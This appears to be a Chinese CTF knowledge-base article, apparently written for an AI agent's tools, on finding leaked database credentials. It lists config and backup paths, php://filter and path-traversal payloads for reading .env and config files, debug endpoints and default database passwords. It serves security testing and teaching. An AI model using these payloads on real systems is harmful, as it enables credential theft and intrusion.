---
id: "ctf-website/24-database/04-config-exposure"
title: "Database Config Exposure — 数据库配置泄露"
title_en: "Database Config Exposure — Configuration & Credential Leaks"
summary: >
  数据库凭证泄露的常见路径与利用方法：PHP/Java/Python/Node.js应用配置文件路径枚举（.env/config.php/application.properties）、备份文件暴露（.bak/.swp/.old）、Git/SVN版本控制泄露、phpinfo()信息泄露、Spring Boot Actuator环境变量暴露，以及各数据库默认凭证表。
summary_en: >
  Common paths and exploitation methods for database credential leaks: framework config file enumeration (.env, config.php, application.properties), backup file exposure (.bak, .swp, .old), Git/SVN version control leaks, phpinfo() information disclosure, Spring Boot Actuator env exposure, and default credential tables for major databases.
board: "ctf-website"
category: "24-database"
signals:
  - ".env 文件可读"
  - "config.php backup .bak .swp"
  - ".git/HEAD 目录泄露"
  - "phpinfo() DOCUMENT_ROOT"
  - "actuator/env Spring Boot"
  - "web.config 暴露"
  - "php://filter 源码读取"
  - "默认密码 root:root sa:sa"
mcp_tools:
  - "http_probe"
  - "kb_router"
  - "kb_read_file"
keywords:
  - "数据库配置泄露"
  - ".env 文件"
  - "config.php"
  - "备份文件"
  - "Git 泄露"
  - "phpinfo()"
  - "默认密码"
  - "Spring Boot actuator"
  - "连接字符串"
  - "源码泄露"
difficulty: "beginner"
tags:
  - "database"
  - "configuration"
  - "credentials"
  - "information-disclosure"
  - "backup"
  - "default-passwords"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# Database Config Exposure — 数据库配置泄露

> 配置文件、连接字符串、环境变量...数据库凭证泄露的常见路径与利用方法。

## 关键词

`配置泄露` `连接字符串` `.env` `config.php` `web.config` `数据库密码` `源码泄露` `备份文件` `phpinfo` `debug模式` `ThinkPHP配置` `Laravel .env` `Spring Boot` `Django settings`

## 1. 常见配置文件路径

### 1.1 PHP 应用

```
/.env                      # Laravel / Symfony
/.env.local                # 本地开发
/.env.production           # 生产环境
/config.php                # 自定义 PHP
/config/database.php       # Laravel / ThinkPHP
/application/database.php  # CodeIgniter
/app/config/database.php   # 旧版框架
/bootstrap/cache/config.php # Laravel 缓存
/thinkphp/.env             # ThinkPHP
```

### 1.2 Java 应用

```
/WEB-INF/web.xml
/WEB-INF/classes/application.properties
/WEB-INF/classes/application.yml
/src/main/resources/application.properties
/actuator/env              # Spring Boot Actuator
```

### 1.3 Python 应用

```
/.env
/settings.py
/local_settings.py
/config/settings.py
```

### 1.4 Node.js 应用

```
/.env
/config.js
/config/database.js
/server/config.js
```

### 1.5 ASP.NET

```
/web.config
/appsettings.json
/appsettings.Production.json
```

## 2. 备份文件暴露

```
config.php.bak
config.php~
config.php.save
config.php.swp
config.php.old
config.php.orig
config.php.txt
config.php.1
config.php_20250101
```

## 3. 版本控制泄露

```
/.git/HEAD                 → 然后 git-dumper
/.git/config               → 包含远程仓库地址
/.svn/entries              → SVN 泄露
/.svn/wc.db                → SVN 数据库
/.DS_Store                 → Mac 目录结构
```

## 4. PHP 源码读取

### 4.1 PHP Filter Wrapper

```
?file=php://filter/read=convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=../config/database.php
```

### 4.2 文件包含

```
?page=../../.env
?template=../../../config/database.php
?mod=../config
```

### 4.3 路径遍历

```
?file=....//....//....//config.php
?download=....//....//....//.env
```

## 5. Debug 信息泄露

### 5.1 PHP

```
?phpinfo=1
?debug=1
PHP 错误堆栈泄露文件路径
ThinkPHP trace 页面
Laravel debugbar
Whoops error handler
```

### 5.2 Java

```
/actuator/env              # Spring Boot 环境变量
/actuator/configprops      # 配置属性
/actuator/mappings         # 路由映射
```

### 5.3 Python

```
DEBUG=True 时的 Django 错误页
Flask debug mode → 代码执行
```

## 6. 默认凭证

| 数据库 | 默认用户 | 默认密码 |
|--------|---------|---------|
| MySQL | root | (空) / root |
| PostgreSQL | postgres | postgres |
| MSSQL | sa | (空) / sa |
| Oracle | system / sys | manager / change_on_install |
| MongoDB | (无认证) | — |
| Redis | (无认证) | — |
| Elasticsearch | elastic | changeme (旧版) |
| phpMyAdmin | root | (空) |
| Adminer | (无认证) | — |

## 7. phpinfo() 信息泄露

```
?phpinfo=1
/info.php
/phpinfo.php
/test.php?phpinfo=1
```

从 phpinfo 可获取：
- DOCUMENT_ROOT（网站根目录）
- DB_HOST / DB_USER / DB_PASS（如果配置了环境变量）
- `disable_functions`（可执行函数列表）
- `open_basedir`（目录访问限制）
- `Loaded Configuration File`（php.ini 路径）

## 攻击链 / 工作流

```
1. 枚举常见配置路径：.env、config.php、application.yml、settings.py、web.config
2. 结合目录遍历、源码泄露、备份文件、php filter 或 debug 页面读取配置
3. 提取连接字符串、DB_HOST、DB_USER、DB_PASS、Redis/Mongo URI 等字段
4. 判断凭证作用域：本地数据库、内网数据库、云 RDS、缓存服务、消息队列
5. 只做最小登录/版本/权限验证，避免写入或修改业务数据
6. 关联后续链路：SQLi 文件读写、NoSQL 未授权、备份下载、管理后台登录
7. 记录泄露路径和脱敏凭证片段，输出清理与轮换建议
```

## Evidence

| 证据类型 | 记录内容 |
|----------|----------|
| 泄露入口 | URL、参数、文件路径、状态码、响应长度 |
| 配置字段 | 脱敏后的 host/user/database/driver/port |
| 访问验证 | 只读登录成功、版本查询、权限边界 |
| 环境信息 | phpinfo/debug 页面中的 DOCUMENT_ROOT、open_basedir、框架版本 |
| 修复验证 | 文件不可读、debug 关闭、凭证轮换后旧凭证失效 |

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 .env、config leak、phpinfo、connection string 搜索 |
| HTTP 探测 | `http_probe` | 验证配置文件、debug 页面和状态码 |
| 工具执行 | `run_ctf_tool` | 调用目录扫描、git-dumper、curl 等工具 |
| 证据记录 | `workspace_write_text` | 保存脱敏配置和验证结果 |

## 8. 关联技术

- [[01-sqli-fundamentals]] — 获凭证后连接数据库
- [[03-nosql-injection]] — NoSQL 未授权
- [[05-backup-log-leak]] — 备份文件暴露
- [[file-upload-xxe-lfi]] — 文件读取
